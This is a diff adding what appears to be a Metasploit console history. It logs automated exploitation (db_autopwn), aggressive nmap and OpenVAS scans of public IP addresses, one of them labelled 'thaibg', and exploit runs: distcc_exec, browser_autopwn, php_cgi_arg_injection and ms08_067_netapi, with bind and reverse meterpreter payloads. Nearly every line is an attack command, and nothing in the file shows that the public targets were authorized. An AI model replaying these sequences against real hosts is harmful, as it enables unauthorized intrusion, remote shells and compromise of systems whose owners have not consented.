@@ -1,0 +1,360 @@
+load db_autopwn.rb
+load db_autopwn
+load db_autopwn
+load twitt 
+load pentest 
+load db_autopwn 
+load db_autopwn 
+load db_autopwn 
+load xssf 
+load post_auto 
+load growl 
+load auto_exploit 
+load pentest 
+exit
+load db_autopwn
+load db_autopwn
+load db_autopwn
+load db_autopwn
+load db_autopwn
+load db_autopwn
+load db_autopwn
+exit
+load db_autopwn 
+db_nmap -sS -O -Pn -n 122.155.166.92
+db_status 
+hosts 
+services 
+db_autopwn 
+db_autopwn -t -e -p 
+db_status 
+db_nmap 
+db_hosts
+db_hosts -h
+db_hosts -d 192.168.1.3 
+db_hosts 
+db_hosts
+db_hosts -d 192.168.1.1
+db_hosts
+db_hosts -d 122.155.166.92
+db_nmap -T Aggressive -sV -n -O -v 122.155.166.92
+db_hosts
+db_services
+search directadmin
+db_autopwn
+db_autopwn -h
+db_autopwn -t -e -p
+load db_autopwn 
+db_autopwn -t -e -p
+exit
+db_status 
+load openvas
+openvas_connect 
+exit
+load openvas
+openvas_connect bangbox bangbox 127.0.0.1 9390 ok
+openvas_config_list 
+openvas_target_create 
+openvas_target_create thaibg 61.19.252.140 Scanning
+openvas_task_start 1
+openvas_config_list
+openvas_task_start 0
+openvas_task_list 
+openvas_target_list 
+openvas_config_list 
+openvas_task_list 
+openvas_target_list 
+openvas_target_list 
+openvas_config_list 
+openvas_config_list 0
+openvas_target_list 
+openvas_task_list 
+openvas_task_list 0
+openvas_task_list 1
+openvas_task_start
+openvas_task_start 0
+openvas_task_start 1
+openvas_task_resume_or_start
+openvas_task_resume_or_start 0
+openvas_task_resume_or_start 2
+openvas_task_resume_or_start 2
+openvas_task_resume_or_start 1
+openvas_task_list 
+openvas_target_list 
+openvas_target_delete 
+openvas_target_delete 0
+openvas_task_list 
+openvas_target_list 
+openvas_task_create 
+openvas_task_create thaibg v-scanning 1 1
+openvas_task_list 
+openvas_task_start 0
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_task_list 
+openvas_report_list
+openvas_report_download 1 4 /root/Desktop bangbox
+openvas_report_import 1 4
+vulns
+load db_autopwn 
+db_autopwn -e -t -p
+db_status 
+load auto_exploit 
+vuln_exploit 
+openvas_report_list 
+openvas_report_import 1 4
+vulns 
+db_import 
+db_autopwn 
+db_status 
+hosts 
+hosts -h
+hosts -d 122.155.166.92
+hosts 
+db_autopwn -e -p -q
+hosts 
+openvas_report_list 
+openvas_task_list 
+openvas_target_list 
+exit
+exit
+search distcc
+search distcc
+exit
+db_rebuild_cache
+search distcc
+exit
+db_rebuild_cache 
+db_status 
+db_rebuild_cache 
+db_disconnect 
+db_connect 
+db_status 
+exit
+db_status 
+db_rebuild_cache 
+search distcc
+search distcc
+search distcc
+use exploit/unix/misc/distcc_exec
+show options 
+set RHOST 192.168.1.2
+show options 
+show payloads 
+set payload cmd/unix/bind_perl
+show options 
+exploit 
+exit
+search mysql
+use auxiliary/scanner/mysql/mysql_login
+show options 
+set RHOSTS 192.168.1.2
+exit
+use auxiliary/server/browser_autopwn 
+show options 
+set LHOST 192.168.1.5
+set SRVPORT 80
+set URIPATH /
+run
+sessions -l
+sessions -l
+sessions -l
+sessions -l
+sessions -l
+sessions -l
+sessions -l
+sessions -i 1
+sessions -l
+exit
+exit
+search distcc
+exit
+db_rebuild_cache
+search distcc
+db_rebuild_cache
+search distcc
+search distcc
+search distcc
+db_rebuild_cache 
+search distcc
+search distcc
+exit
+db_rebuild_cache 
+exit
+db_rebuild_cache 
+search distcc
+db_rebuild_cache 
+search distcc
+db_rebuild_cache 
+search distcc
+search distcc
+exit
+exit
+search ms13_005
+search hwnd
+search windows
+cd /opt/metasploit
+cd apps
+cd pro/msf3
+cd modules
+cd ex*
+cd exploits
+cd windows/local
+exit
+exit
+exit
+exit
+exit
+exit
+exit
+exit
+exit
+exit
+exit
+exit
+search a
+exit
+search a
+use exploit/multi/http/php_cgi_arg_injection 
+show options
+set RHOST 172.16.0.31
+set RHOST 172.16.0.91
+set TARGETTURI /phpinfo.php
+set PAYLOAD php/meterpreter/bind_tcp
+exploit
+show options
+exploit
+set RHOST 172.16.0.91
+set TARGETURI /phpinfo.php
+set PAYLOAD php/meterpreter/bind_tcp
+exploit
+search openssl
+search ms10
+search ms08-
+use exploit/windows/smb/ms08_067_netapi
+show options
+set RHOST 172.16.0.54
+exploit
+exit
+search aa
+search aaa
+search aaa
+exit
+back
+db_status
+back
+setg
+back
+use windows/meterpreter/reverse_tcp
